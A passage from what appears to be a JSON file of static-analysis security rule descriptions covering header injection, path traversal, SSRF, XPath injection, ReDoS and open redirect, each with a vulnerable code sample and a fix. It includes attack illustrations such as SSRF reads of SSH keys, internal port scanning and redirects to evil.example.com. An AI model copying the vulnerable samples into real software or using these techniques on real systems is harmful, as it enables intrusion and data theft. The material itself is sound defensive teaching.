HTTP response, an attacker can force the application’s hosting infrastructure to store a maliciously\ncrafted web page in a cache. Every user that will later try to access the page or resource which cached version has been poisoned will therefore be\npresented with malicious content.</p>\n<p>Such an attack can make the impact of other mentioned exploitation scenario higher.</p>\n<h2>How to fix it</h2>\n<p>As a best practice, applications that construct response headers using user-provided data should always implement rigorous validation or sanitation\nof this data.</p>\n<p>Also, note that most high-level and modern web development frameworks integrate a built-in protection measure and are thus immune to response\nsplitting attacks. Using such a framework should be considered.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom http.server import BaseHTTPRequestHandler\nfrom urllib.parse import urlparse, parse_qs\n\nclass ReqHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        parsed = urlparse(self.path)\n        params = parse_qs(parsed.query)\n        self.send_response(200)\n        self.send_header(\"Content-Type\", params.get('accept')[0]) # Noncompliant\n        self.end_headers()\n        self.wfile.write(bytes(\"Hello World!\", \"utf-8\"))\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom http.server import BaseHTTPRequestHandler\nfrom urllib.parse import urlparse, parse_qs, quote\n\nclass ReqHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        parsed = urlparse(self.path)\n        params = parse_qs(parsed.query)\n        self.send_response(200)\n        self.send_header(\"Content-Type\", quote(params.get('accept')[0])) # Compliant\n        self.end_headers()\n        self.wfile.write(bytes(\"Hello World!\", \"utf-8\"))\n</pre>\n<h3>How does this work?</h3>\n<p>By applying a URL encoding to an untrusted header value, the application ensures that all special characters are properly escaped before they are\nadded to the HTTP response. Especially <code>\\r</code> (Carriage Return) and <code>\\n</code> (Line Feed) characters will be encoded to\n<code>%0D</code> and <code>%OA</code> and won’t be able to alter the HTTP response’s semantics.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OWASP - <a href=\"https://www.owasp.org/index.php/HTTP_Response_Splitting\">HTTP Response Splitting</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/113\">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response\n  Splitting')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "pythonsecurity:S2083": {
        "name": "I/O function calls should not be vulnerable to path injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting\npath would resolve somewhere in the filesystem where the user should not normally have access to.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override or delete arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited\nto remove or corrupt files that are critical for the application or for the system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h4>Read arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to\nleak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>\n<h2>How to fix it in Flask</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>\n<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom flask import Flask, request, send_from_directory\n\napp = Flask('example')\n\n@app.route('/example')\ndef example():\n    my_file = request.args['my_file']\n    return send_file(\"static/%s\" % my_file, as_attachment=True) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom flask import Flask, request, send_from_directory\n\napp = Flask('example')\n\n@app.route('/example')\ndef example():\n    my_file = request.args['my_file']\n    return send_from_directory('static', my_file)\n</pre>\n<h3>How does this work?</h3>\n<p>The universal method to prevent path injection is to validate paths created from untrusted data. This can be done either manually or automatically,\ndepending on whether the library includes a data sanitization feature and the required function.</p>\n<p>Here, send_from_directory can be considered a secure-by-design API.</p>\n<h4>Use secure-by-design APIs</h4>\n<p>Some libraries contain APIs with these three capabilities:</p>\n<ul>\n  <li> File retrieval in a file system. </li>\n  <li> Restriction of the file retrieval to a specific folder (thus sanitizing and validating untrusted data). </li>\n  <li> A feature, such as a file download or file deletion. </li>\n</ul>\n<p>They can be referred to as \"secure-by-design\" APIs. Using this type of API, such as 'send_from_directory', brings multiple layers of security to\nthe code while keeping the code base shorter.</p>\n<p>Behind the scenes, this function protects against both regular and partial path injection.</p>\n<h3>Pitfalls</h3>\n<h4>Do not use os.path.join as a validator</h4>\n<p>The <a href=\"https://docs.python.org/3/library/os.path.html#os.path.join\">official documentation</a> states that if any argument other than the\nfirst is an absolute path, any previous argument is discarded.</p>\n<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal\nvulnerability.</p>\n<p>If you want to learn more about this pitfall, read <a href=\"https://blog.sonarsource.com/10-unknown-security-pitfalls-for-python/\">our blog post\nabout it</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "pythonsecurity:S5144": {
        "name": "Server-side requests should not be vulnerable to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>\n<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s\nresponse.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be\ntreated in the same way as basic SSRF.</p>\n<h3>What is the potential impact?</h3>\n<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to\nwhat is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>\n<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can\nrange from low to critical severity.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Local file read to host takeover</h4>\n<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File\nURI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web\napplication.</p>\n<h4>Internal Network Reconnaissance</h4>\n<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port\nfield in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for\nexample, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>\n<h2>How to fix it in Python Standard Library</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom flask import request\nfrom urllib.request import urlopen\n\n@app.route('/example')\ndef example():\n    url = request.args[\"url\"]\n    urlopen(url).read() # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom flask import request\nfrom urllib.parse import urlparse\nfrom urllib.request import urlopen\n\nSCHEMES_ALLOWLIST = ['https']\nDOMAINS_ALLOWLIST = ['trusted1.example.com', 'trusted2.example.com']\n\n@app.route('/example')\ndef example():\n    url = request.args[\"url\"]\n    if urlparse(url).hostname in DOMAINS_ALLOWLIST and urlparse(url).scheme in SCHEMES_ALLOWLIST:\n        urlopen(url).read()\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.commit.malicious.io</code>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">Top 10 2021 Category A10 - Server-Side Request\n  Forgery (SSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/918\">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "pythonsecurity:S6287": {
        "name": "Applications should not create session cookies from untrusted input",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>\n<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the\napplication.</p>\n<p>The injection might occur via a GET parameter, and the payload, for example, <code><a\nhref=\"https://example.com?cookie=injectedcookie\">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a\nsession that isn’t theirs.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Sensitive data disclosure</h4>\n<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of\nimplications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>\n<h4>Vulnerability chaining</h4>\n<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and\nexploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,\nwhich can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>\n<h2>How to fix it in Django</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom django.shortcuts import render\n\ndef check_cookie(request):\n    response = render(request, \"welcome.html\")\n\n    if not \"sessionid\" in request.COOKIE:\n        cookie = request.GET.get(\"cookie\")\n        response.set_cookie(\"sessionid\", cookie)  # Noncompliant\n\n    return response\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom django.http import HttpResponseRedirect\nfrom django.shortcuts import render\n\ndef check_cookie(request):\n    response = render(request, \"welcome.html\")\n\n    if not \"sessionid\" in request.COOKIE:\n        return HttpResponseRedirect(\"/getcookie\")\n\n    return response\n</pre>\n<h3>How does this work?</h3>\n<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the\nvalue of a session cookie to untrusted data.</p>\n<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade\ntools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to\nuse these solutions than to develop your own.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "pythonsecurity:S6350": {
        "name": "Constructing arguments of system commands from user input is security-sensitive",
        "htmlDesc": "<p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920\">CVE-2016-9920</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472\">CVE-2021-29472</a> </li>\n</ul>\n<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the\nprograms. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing\nfiles into specific directories.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Malicious arguments can result in undesired behavior in the executed command. </li>\n  <li> Passing user input to a system command is not necessary. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid constructing system commands from user input when possible. </li>\n  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>\n  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in\nvulnerabilities:</p>\n<pre>\nimport subprocess\ninput = request.get('input')\nsubprocess.run([\"/usr/bin/find\", input]) # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use an allow-list to restrict the arguments to trusted values:</p>\n<pre>\nimport subprocess\ninput = request.get('input')\nif input in allowed:\n    subprocess.run([\"/usr/bin/find\", input])\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/php-supply-chain-attack-on-composer\">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>\n</ul>",
        "severity": "MAJOR"
      },
      "pythonsecurity:S6680": {
        "name": "Loop boundaries should not be vulnerable to injection attacks",
        "htmlDesc": "<p>This vulnerability exposes the system to various operational overloads that can lead to either a technical denial of service and/or business\ndisruptions.</p>\n<h2>Why is this an issue?</h2>\n<p>Loop boundary injections occur in an application when the application retrieves data from a user or a third-party service and inserts it into a\nloop or a function acting as a loop, without sanitizing it first.</p>\n<p>If an application contains a loop that is vulnerable to injections, it is exposed to attacks that target its availability where that loop is\nused.</p>\n<p>A user with malicious intent carefully performs actions whose goal is to cause the loop to run for more iterations than the developer intended,\nresulting in unexpected behavior or even a crash of the program.</p>\n<p>After creating the malicious request, the attacker can attack the servers affected by this vulnerability without relying on any prerequisites.</p>\n<h3>What is the potential impact?</h3>\n<p>After discovering the injection point, attackers insert data into the vulnerable field to either make the affected component inaccessible, attempt\na malfunction, or read from an artifact that exceeds the developer’s intended boundaries.</p>\n<p>In languages that don’t enforce memory access checks, this can also lead to a buffer overflow or underflow which may result in sensitive\ninformation disclosure or remote code execution.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Self Denial of service</h4>\n<p>If the component affected by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service might only affect the attacker who initiated it.</p>\n<p>Even if the denial of service has little direct impact, it can cause secondary effects in architectures that use containers and container\norchestrators. It could cause unexpected container failures or resource overconsumption, for example.</p>\n<h4>Infrastructure SPOFs</h4>\n<p>A denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture\nvulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient\ncontainer creation capabilities or failures from containers to terminate).</p>\n<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge\noffensive infrastructures.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\ndef example():\n    limit = int(request.args.get('limit'))\n\n    for _ in range(limit):\n        # ...\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\ndef example():\n    limit = int(request.args.get('limit'))\n    restricted_limit = min(10, limit)\n\n    for _ in range(restricted_limit):\n        # ...\n</pre>\n<h3>How does this work?</h3>\n<h4>Set limits</h4>\n<p>Validate loop variable values to ensure they fall within the expected bounds. If a value falls outside of these bounds, reject it as invalid or\nadjust it to bring it within bounds. This guarantees that the loop will only iterate over the expected number of elements or perform the expected\nnumber of iterations.</p>\n<p>Do not assume that users will provide sensible values. Attackers intentionally choose unusual values to cause the system to misbehave.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/606\">CWE-606 - Unchecked Input for Loop Condition</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "pythonsecurity:S2091": {
        "name": "XPath expressions should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without\nsanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to XPath injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to execute malicious commands in the affected XML documents.</p>\n<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br> In cases where organizations rely on XML\nstructures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to\nharmless.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data Leaks</h4>\n<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility\nstill exists with configuration files, for example.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query allows the attacker to delete data in the affected XML documents.<br> This threat is particularly insidious if the attacked\norganization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the\nregular operations of an organization.</p>\n<h2>How to fix it in lxml</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to XPath injection because untrusted data is concatenated to an XPath query without prior\nvalidation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom flask import request\nfrom lxml import etree\n\n@app.route('/authenticate')\ndef authenticate():\n    username = request.args['username']\n    password = request.args['password']\n    expression = \"./users/user[@name='\" + username + \"' and @pass='\" + password + \"']\"\n    tree = etree.parse('resources/users.xml')\n\n    if tree.find(expression) is None:\n        return \"Invalid credentials\", 401\n    else:\n        return \"Success\", 200\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom flask import request\nfrom lxml import etree\n\n@app.route('/authenticate')\ndef authenticate():\n    username = request.args['username']\n    password = request.args['password']\n    expression = \"./users/user[@name=$username and @pass=$password]\"\n    tree = etree.parse('resources/users.xml')\n\n    if tree.xpath(expression, username=username, password=password) is None:\n        return \"Invalid credentials\", 401\n    else:\n        return \"Success\", 200\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<h4>Parameterized Queries</h4>\n<p>For XPath injections, the cleanest way to do so is to use parameterized queries.</p>\n<p>XPath allows for the usage of variables inside expressions in the form of <code>$variable</code>. XPath variables can be used to construct an XPath\nquery without needing to concatenate user arguments to the query at runtime. Here is an example of an XPath query with variables:</p>\n<pre>\n/users/user[@user=$user and @pass=$pass]\n</pre>\n<p>When the XPath query is executed, the user input is passed alongside it. During execution, when the values of the variables need to be known, a\nresolver will return the correct user input for each variable. The contents of the variables are not considered application logic by the XPath\nexecutor, and thus injection is not possible.</p>\n<p>In the example, the username and password are passed as <a\nhref=\"https://lxml.de/xpathxslt.html#:~:text=The%20xpath()%20method%20has%20support%20for%20XPath%20variables%3A\">XPath variables</a> rather than\nconcatenated to the XPath query. By using a parameterized query, injection is successfully prevented.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/643\">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S2631": {
        "name": "Regular expressions should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>\n<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this\ncan lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to make the affected component inaccessible.</p>\n<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Self Denial of Service</h4>\n<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)\ncan trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>\n<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>\n<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service might only affect the attacker who initiated it.</p>\n<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems\nwould detect the failure of a container and automatically replace it.</p>\n<h4>Infrastructure SPOFs</h4>\n<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture\nvulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient\ncontainer creation capabilities or failures from containers to terminate).</p>\n<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge\noffensive infrastructures.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without\nprior sanitization or validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst express = require('express');\n\nconst app = express();\n\napp.get('/lookup', (req, res) =&gt; {\n  const regex = RegExp(req.query.regex); // Noncompliant\n\n  if(regex.test(req.query.data)){\n    res.send(\"It's a Match!\");\n  }else{\n    res.send(\"Not a Match!\");\n  }\n})\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst express = require('express');\nconst escapeStringRegexp = require('escape-string-regexp');\n\nconst app = express();\n\napp.get('/lookup', (req, res) =&gt; {\n  const regex = RegExp(escapeStringRegexp(req.query.regex));\n\n  if(regex.test(req.query.data)){\n    res.send(\"It's a Match!\");\n  }else{\n    res.send(\"Not a Match!\");\n  }\n})\n</pre>\n<h3>How does this work?</h3>\n<h4>Sanitization and Validation</h4>\n<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular\nexpression engine interprets these characters literally.</p>\n<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>\nIf a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>\n<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>\n<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href=\"https://github.com/google/re2\">re2</a>.</p>\n<p>In the compliant solution, the <code>escapeStringRegexp</code> function provided by the npm package <code>escape-string-regexp</code> escapes\nmetacharacters and escape sequences that could have broken the initially intended logic.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">OWASP Regular expression Denial of Service - ReDoS</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "tssecurity:S5146": {
        "name": "HTTP request redirections should not be open to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>\n<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as\n<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>\n<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker\nto build a credible pretext to prevent suspicions from the victim.<br></p>\n<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>\n<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Domain Mirroring</h4>\n<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the\nsimilarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a\nmalicious domain.<br></p>\n<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any\nauthenticated data or action.</p>\n<h4>Malware Distribution</h4>\n<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the\nattacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a\nhosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>\n<h2>How to fix it in Express.js</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used\nto redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nserver.get('/redirect', (request, response) =&gt; {\n\n   response.redirect(request.query.url); // 